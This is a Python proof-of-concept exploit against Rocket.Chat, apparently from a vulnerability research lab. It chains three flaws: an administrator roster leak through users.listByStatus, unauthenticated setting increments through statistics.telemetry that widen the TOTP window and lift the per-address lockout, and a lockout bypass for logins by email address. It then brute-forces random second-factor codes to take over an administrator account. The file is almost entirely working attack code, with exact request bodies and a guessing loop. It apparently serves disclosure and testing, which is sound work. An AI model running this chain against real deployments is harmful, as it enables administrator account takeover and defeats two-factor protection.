r"""
CHAIN-002 - An ordinary Rocket.Chat account turns the workspace's second factor
            off for everybody, then guesses its way into an administrator

Steps (each proven on its own in stage 11; this script runs them as one attack):
  1. VULN-007  users.listByStatus returns every account's email address and role
               list to the lowest-privileged account, and takes a roles filter.
               -> the administrators, by name and by address.
  2. VULN-057  statistics.telemetry dispatches updateCounter, which increments
               any numeric setting for any authenticated caller. Two settings are
               raised: Accounts_TwoFactorAuthentication_MaxDelta (the TOTP drift
               window) and Block_Multiple_Failed_Logins_Attempts_Until_Block_By_Ip
               (the per-address brake on guessing).
               -> a TOTP window wide enough that a random six-digit code verifies
                  with probability (2*window+1)/1e6, and no per-address block.
  3. VULN-032  the per-user failed-login block reads the username as typed, so
               an account named by its email address is never locked out, however
               many codes are guessed against it.
               -> unlimited second-factor guesses against one named account.

Vulnerable code:
  targets/rocket.chat/apps/meteor/server/api/v1/users.ts (users.listByStatus:
      every address and role to any caller)
  targets/rocket.chat/apps/meteor/server/lib/statistics/functions/updateStatsCounter.ts:10
      (increments the settings id the caller names)
  targets/rocket.chat/apps/meteor/server/lib/2fa/lib/totp.ts:46-56 (the window
      setting is handed straight to speakeasy.totp.verifyDelta)
  targets/rocket.chat/apps/meteor/server/lib/auth/restrictLoginAttempts.ts:98-145
      (the per-user block keys on login.methodArguments[0].user.username)

The chain
---------
None of the three reaches an account on its own. The roster is a disclosure; the
settings write is a configuration change with no obvious victim; the lockout
bypass only matters if guessing is cheap. Together they make the second factor a
formality: the attacker reads which accounts are administrators, widens the TOTP
window from one time step to tens of thousands, lifts the per-address failed-login
ceiling that would otherwise stop the attempt at fifty, and then grinds random
codes against the account named by its email address, which no lockout ever
counts.

The attacker starts with an ordinary account and the victim's password, which is
the exact situation TOTP exists to survive (a phished, reused or breached
password). This run proves it does not survive it.

What a successful run proves
---------------------------
An account created through the public registration form read the workspace's
administrators out of the directory API, rewrote two of the workspace's
authentication settings with no permission, and then logged in to a
TOTP-protected administrator account with a code it guessed, without ever being
locked out. The run restores both settings and deletes everything it created.

Dependencies: requests, pyotp (pyotp only to enrol the victim's second factor
during setup; the attack itself guesses blind).
"""
import datetime as _dt
import hashlib
import json
import os
import random
import re as _re
import secrets
import sys
import time

import pyotp
import requests

# --- Blue Spider standalone exploit preamble (self-contained; copy, do not import) ---
VULN = "CHAIN-002"                                   # this chain's id (the preamble's id slot)
BASE_URL = os.environ.get("BASE_URL", "http://127.0.0.1:39649").rstrip("/")
HERE = os.path.dirname(os.path.abspath(__file__))
_ANSI = _re.compile(r"\x1b\[[0-9;]*m")


class _Tee:
    def __init__(self, term, logf):
        self.term, self.logf = term, logf

    def write(self, s):
        self.term.write(s)
        self.logf.write(_ANSI.sub("", s))

    def flush(self):
        self.term.flush()
        self.logf.flush()


# automation.py writes run.log; any other script writes <its name>.log, so the
# scripts sharing a folder keep their own transcripts.
_ME = os.path.splitext(os.path.basename(os.path.abspath(__file__)))[0]
_logf = open(os.path.join(HERE, "run.log" if _ME == "automation" else _ME + ".log"),
             "w", encoding="utf-8")
_TERM_IS_TTY = sys.__stdout__.isatty() and not os.environ.get("NO_COLOR")
sys.stdout = _Tee(sys.__stdout__, _logf)
sys.stderr = _Tee(sys.__stderr__, _logf)

_C = {"INFO": "36", "SETUP": "33", "STEP": "33", "PROOF": "35", "OK": "32", "FAIL": "31"}


def log(tag, msg):
    """One status line: coloured on a live terminal, plain in run.log."""
    if _TERM_IS_TTY and tag in _C:
        print(f"\033[1;{_C[tag]}m[{tag}]\033[0m {msg}", flush=True)
    else:
        print(f"[{tag}] {msg}", flush=True)


def rand(n=4):
    """A short random suffix so accounts, uploads and tokens never collide."""
    return secrets.token_hex(n)


def save(name, text):
    """Write evidence beside the script (request.http, response.txt, ...)."""
    path = os.path.join(HERE, name)
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w", encoding="utf-8") as fh:
        fh.write(text)


def verdict(status, summary):
    """The one standard line a run ends on; returns the process exit code."""
    day = _dt.datetime.now(_dt.timezone.utc).strftime("%Y-%m-%d")
    status = status.strip().upper()
    log("OK" if status == "CONFIRMED" else "FAIL", f"{VULN} {status}")
    print(f"==> {VULN} {status} {day} - {summary}", flush=True)
    return 0 if status == "CONFIRMED" else 1
# --- end preamble ---

ADMIN_USER = os.environ.get("ADMIN_USER", "admin")                 # manifest admin: provisioning only
ADMIN_PASS = os.environ.get("ADMIN_PASS", "Bspdr-Lab-Adm1n!")      # manifest admin password
# How wide the attacker makes the TOTP window. The acceptance probability of one
# random six-digit code is (2*WINDOW+1)/1e6, so 4000 means about one guess in a
# hundred and twenty-five lands. Raising it shortens the grind and lengthens the
# settings write; both are the attacker's choice, which is the point of the
# finding. The batch size is kept at fifty per request because the handler fires
# every increment without awaiting it, and larger batches make the workspace
# answer 503 (a denial of service this chain does not need).
WINDOW = int(os.environ.get("CHAIN_TOTP_WINDOW", "4000"))
IP_ALLOWANCE = int(os.environ.get("CHAIN_IP_ALLOWANCE", "1500"))   # failed logins to buy per address
BATCH = int(os.environ.get("CHAIN_TELEMETRY_BATCH", "50"))         # increments per telemetry request
MAX_GUESSES = int(os.environ.get("CHAIN_MAX_GUESSES", "1200"))     # give up after this many codes

MAXDELTA = "Accounts_TwoFactorAuthentication_MaxDelta"
IPBLOCK = "Block_Multiple_Failed_Logins_Attempts_Until_Block_By_Ip"


def api(sess, method, path, **kw):
    """One REST call against the workspace."""
    return sess.request(method, f"{BASE_URL}{path}", timeout=60, **kw)


def login(username, password, code=None):
    """A requests.Session carrying X-Auth-Token / X-User-Id for that account."""
    body = {"user": username, "password": password}
    if code:
        body["code"] = code
    s = requests.Session()
    r = api(s, "POST", "/api/v1/login", json=body)
    d = r.json()
    if d.get("status") != "success":
        raise RuntimeError(f"login {username} failed: {r.status_code} {r.text[:200]}")
    s.headers.update({"X-Auth-Token": d["data"]["authToken"], "X-User-Id": d["data"]["userId"]})
    return s


def mkuser(adm, name, pw, roles=("user",)):
    r = api(adm, "POST", "/api/v1/users.create", json={
        "username": name, "name": name, "email": f"{name}@lab.invalid", "password": pw,
        "roles": list(roles), "joinDefaultChannels": False, "verified": False,
        "requirePasswordChange": False})
    if not r.json().get("success"):
        raise RuntimeError(f"could not create {name}: {r.text[:200]}")
    return r.json()["user"]["_id"]


def rmuser(adm, uid):
    api(adm, "POST", "/api/v1/users.delete", json={"userId": uid, "confirmRelinquish": True})


def banner(title):
    print("=" * 72)
    print(f"{VULN}: {title}")
    print(f"target : {BASE_URL}")
    print("author : Blue Spider")
    print("=" * 72)


def tfa():
    """The password-fallback second factor an administrator's settings write needs."""
    return {"x-2fa-method": "password", "x-2fa-code": hashlib.sha256(ADMIN_PASS.encode()).hexdigest()}


def get_setting(adm, sid):
    r = api(adm, "GET", f"/api/v1/settings/{sid}")
    return r.json().get("value") if r.status_code == 200 else None


def set_setting(adm, sid, value):
    """Used only to put the lab back as it was; the attack never needs it."""
    api(adm, "POST", f"/api/v1/settings/{sid}", json={"value": value}, headers=tfa())


def bump(sess, sid, times, batch=BATCH):
    """VULN-057: raise a numeric setting by `times`, in telemetry batches. Every
    element of params is one increment of the settings id the caller names, and
    the body schema sets no maxItems."""
    sent = 0
    while sent < times:
        n = min(batch, times - sent)
        body = {"params": [{"eventName": "updateCounter", "settingsId": sid} for _ in range(n)]}
        r = api(sess, "POST", "/api/v1/statistics.telemetry", json=body)
        if r.status_code != 200:
            return sent, r
        sent += n
        time.sleep(0.6)             # the handler fires the writes without awaiting them
    return sent, r


def settle(adm, sid, target, timeout=180):
    """Wait for the fire-and-forget increments to land, and report the value."""
    end = time.time() + timeout
    val = get_setting(adm, sid)
    while time.time() < end and isinstance(val, (int, float)) and val < target:
        time.sleep(2)
        val = get_setting(adm, sid)
    return val


def try_login(identifier, password, code):
    """One login attempt by email address with a second-factor code. Returns
    (status, errorType, authToken)."""
    r = requests.post(f"{BASE_URL}/api/v1/login",
                      json={"user": identifier, "password": password, "code": code}, timeout=60)
    try:
        d = r.json()
    except ValueError:
        return r.status_code, "unparsable", None
    return (r.status_code, (d.get("errorType") or d.get("error") or ""),
            (d.get("data") or {}).get("authToken"))


def main():
    sfx = rand()
    banner("an ordinary account widens the TOTP window, then guesses into an administrator")
    log("INFO", "chaining VULN-007 (the roster, with roles and addresses) -> VULN-057 "
                "(statistics.telemetry writes the 2FA window and the per-address lockout) -> "
                "VULN-032 (a login by email address is never locked out)")
    adm = login(ADMIN_USER, ADMIN_PASS)
    ev = {"window_target": WINDOW, "ip_allowance_target": IP_ALLOWANCE}

    # [SETUP] the victim: a second administrator who did the right thing and
    # enrolled TOTP. The attacker is assumed to hold this account's password
    # (phished, reused or breached), which is the situation TOTP is sold as
    # surviving; everything after this point is the chain.
    vic = f"sadm_{sfx}"
    vic_addr = f"{vic}@lab.invalid"
    vic_pw = f"Victim-Pass-{sfx}!A"
    vic_uid = mkuser(adm, vic, vic_pw, roles=("admin", "user"))
    sv = login(vic, vic_pw)
    seed = api(sv, "POST", "/api/v1/users.enableTotp", json={}).json().get("secret")
    api(sv, "POST", "/api/v1/users.validateTotp", json={"code": pyotp.TOTP(seed).now()})
    log("SETUP", f"victim {vic} is an administrator with TOTP enrolled "
                 f"(the attacker holds its password, not its codes)")

    # [SETUP] the attacker: an ordinary account, as the public registration form
    # creates them.
    atk = f"atk_{sfx}"
    atk_pw = f"Attacker-Pass-{sfx}!A"
    atk_r = requests.post(f"{BASE_URL}/api/v1/users.register",
                          json={"username": atk, "email": f"{atk}@lab.invalid",
                                "pass": atk_pw, "name": atk}, timeout=30)
    if not atk_r.json().get("success"):
        rmuser(adm, vic_uid)
        return verdict("FAILED", f"public registration refused: {atk_r.text[:160]}")
    sa = login(atk, atk_pw)
    atk_uid = sa.headers["X-User-Id"]
    log("SETUP", f"attacker {atk} registered through the public form (role: user)")

    before = {MAXDELTA: get_setting(adm, MAXDELTA), IPBLOCK: get_setting(adm, IPBLOCK)}
    log("SETUP", f"shipped values recorded for the restore: {json.dumps(before)}")
    ev["shipped_values"] = before
    token, priv, locked, tries, w, ipb = None, None, False, 0, None, None

    try:
        # ------------------------------------------------------------- step 1
        # VULN-007: the directory read that tells the attacker whom to attack.
        log("STEP", "1/3 VULN-007: users.listByStatus as the ordinary attacker, filtered to admins")
        path = "/api/v1/users.listByStatus?count=50&roles=admin"
        r = api(sa, "GET", path)
        admins = [(u.get("username"), ((u.get("emails") or [{}])[0]).get("address"), u.get("roles"))
                  for u in (r.json().get("users") or [])]
        found = [a for a in admins if a[1] == vic_addr]
        log("PROOF" if found else "FAIL",
            f"    HTTP {r.status_code}: {len(admins)} administrator(s) with their addresses, from an "
            f"account with no permissions: {admins[:4]}")
        save("request.http", f"GET {path} HTTP/1.1\r\nHost: {BASE_URL.split('//', 1)[1]}\r\n"
                             f"X-Auth-Token: {sa.headers['X-Auth-Token']}\r\n"
                             f"X-User-Id: {atk_uid}\r\nAccept: application/json\r\n\r\n")
        save("response.txt", f"HTTP/1.1 {r.status_code}\n"
                             + "".join(f"{k}: {v}\n" for k, v in r.headers.items()) + "\n" + r.text)
        ev["step1_roster"] = {"status": r.status_code, "admins": admins}

        # ------------------------------------------------------------- step 2
        # VULN-057: the two settings the second factor rests on, written by a
        # caller the product never checked for a permission.
        log("STEP", f"2/3 VULN-057: statistics.telemetry -> {MAXDELTA} + {WINDOW}, "
                    f"{IPBLOCK} + {IP_ALLOWANCE}")
        n1, last1 = bump(sa, MAXDELTA, WINDOW)
        n2, last2 = bump(sa, IPBLOCK, IP_ALLOWANCE)
        w = settle(adm, MAXDELTA, (before[MAXDELTA] or 0) + WINDOW)
        ipb = settle(adm, IPBLOCK, (before[IPBLOCK] or 0) + IP_ALLOWANCE)
        log("PROOF" if w and w > 1 else "FAIL",
            f"    {n1} + {n2} increments accepted (last HTTP {last1.status_code}/{last2.status_code}); "
            f"the workspace now reports {MAXDELTA}={w} (was {before[MAXDELTA]}) and {IPBLOCK}={ipb} "
            f"(was {before[IPBLOCK]})")
        p = (2 * (w or 1) + 1) / 1e6
        log("INFO", f"    a random six-digit code now verifies with probability {p:.4%} "
                    f"(speakeasy window={w}), so the expected grind is about {int(1 / p)} attempts")
        ev["step2_settings"] = {"increments": [n1, n2], "maxdelta_now": w, "ipblock_now": ipb,
                                "per_guess_probability": p}

        # ------------------------------------------------------------- step 3
        # VULN-032: the grind. The account is named by its EMAIL ADDRESS, which
        # isValidAttemptByUser never sees, so no number of failures locks it.
        log("STEP", f"3/3 VULN-032: guessing codes at POST /api/v1/login as {vic_addr} "
                    f"(email form: the per-user block reads the username as typed)")
        rng = random.SystemRandom()
        t0 = time.time()
        errs, token, tries = {}, None, 0
        for i in range(1, MAX_GUESSES + 1):
            tries = i
            st, err, tok = try_login(vic_addr, vic_pw, f"{rng.randrange(1000000):06d}")
            errs[err] = errs.get(err, 0) + 1
            if tok:
                token = tok
                break
            if "blocked" in err:
                break
            if i % 100 == 0:
                log("INFO", f"    {i} codes guessed, answers so far {json.dumps(errs)}, "
                            f"{time.time() - t0:.0f}s elapsed")
        dur = time.time() - t0
        locked = any("blocked" in e for e in errs)
        log("PROOF" if token else "FAIL",
            f"    {tries} guesses in {dur:.0f}s: answers {json.dumps(errs)}; a guessed code was "
            f"accepted={bool(token)}; any attempt refused by a lockout={locked}")
        ev["step3_grind"] = {"attempts": tries, "seconds": round(dur, 1), "answers": errs,
                             "accepted": bool(token), "ever_locked_out": locked}

        # the end state: the guessed session is an administrator's.
        priv = None
        if token:
            sx = requests.Session()
            sx.headers.update({"X-Auth-Token": token, "X-User-Id": vic_uid})
            me = api(sx, "GET", "/api/v1/me")
            priv = api(sx, "GET", f"/api/v1/settings/{MAXDELTA}")       # admin-only read
            ctl = api(sa, "GET", f"/api/v1/settings/{MAXDELTA}")        # the attacker's own account
            log("PROOF", f"    the guessed session is {me.json().get('username')} and reads a private "
                         f"setting (HTTP {priv.status_code}), which the attacker's own ordinary "
                         f"account cannot (HTTP {ctl.status_code})")
            ev["step4_session"] = {"username": me.json().get("username"),
                                   "private_setting_read": priv.status_code,
                                   "same_read_as_ordinary_user": ctl.status_code,
                                   "roles": me.json().get("roles")}
            save("evidence/guessed-admin-session.json", json.dumps(ev["step4_session"], indent=2))
    finally:
        # restore before anything else: the two settings are workspace-wide.
        log("INFO", "cleanup: restoring both settings to their shipped values and removing the "
                    "accounts this run created")
        set_setting(adm, MAXDELTA, before[MAXDELTA])
        set_setting(adm, IPBLOCK, before[IPBLOCK])
        back = {MAXDELTA: get_setting(adm, MAXDELTA), IPBLOCK: get_setting(adm, IPBLOCK)}
        log("INFO", f"    settings restored: {json.dumps(back)}")
        ev["restored"] = back
        rmuser(adm, vic_uid)
        rmuser(adm, atk_uid)

    save("evidence/chain-002.json", json.dumps(ev, indent=2, default=str))
    if token and priv is not None and priv.status_code == 200 and not locked:
        return verdict("CONFIRMED",
                       f"an account from the public registration form read the administrators out of "
                       f"users.listByStatus, raised the TOTP window to {w} and the per-address "
                       f"failed-login ceiling to {ipb} through statistics.telemetry, and logged in to "
                       f"the TOTP-protected administrator with a guessed code after {tries} attempts, "
                       f"never once locked out")
    return verdict("FAILED",
                   f"guessed={bool(token)} attempts={tries} locked_out={locked} window={w}")


if __name__ == "__main__":
    sys.exit(main())
